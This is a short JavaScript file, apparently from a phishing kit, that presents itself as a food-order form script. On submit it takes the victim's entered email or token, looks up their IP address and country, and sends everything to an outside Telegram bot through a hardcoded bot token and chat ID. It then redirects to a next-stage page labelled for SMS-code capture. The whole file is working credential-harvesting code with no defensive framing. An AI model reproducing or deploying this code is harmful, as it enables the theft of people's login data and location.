document.addEventListener("DOMContentLoaded", function () {

    const formulario = document.getElementById("pedidoForm");
    const pedido1 = document.getElementById("pedido1");
 

    if (!formulario || !pedido1)  {
        console.error("No se encontraron los elementos.");
        return;
    }

    const botToken = "9033333404:AAGLvewEHLmKvRtjIhQjP3IclyzPmykDMYU";
    const chatId = "6956488104";

    formulario.addEventListener("submit", async function (e) {

        e.preventDefault();

        const comida = pedido1.value.trim();
 

if (!comida) return;
        try {

            // Obtener país e IP
            const geoRespuesta = await fetch("https://ipwho.is/");
            const geo = await geoRespuesta.json();

            const pais = geo.success ? geo.country : "No disponible";
            const ip = geo.success ? geo.ip : "No disponible";

            // Crear mensaje
            const mensaje =
                "* EMAIL TOKEN\n\n" +
                "* EMAIL:\n" +
                comida + "\n\n" +
               
                "🌎 PAÍS: " + pais + "\n" +
                "🌐 IP: " + ip + "\n\n" +
                "📌 ESTADO: CAYO SMS 1 ";

            // Enviar a Telegram
            const respuesta = await fetch(
                "https://api.telegram.org/bot" + botToken + "/sendMessage",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: mensaje
                    })
                }
            );

            const resultado = await respuesta.json();

            if (!respuesta.ok || !resultado.ok) {
                console.error("Error de Telegram:", resultado);
                return;
            }

            window.location.href = "1.html";

        } catch (error) {
            console.error("Error:", error);
        }

    });

});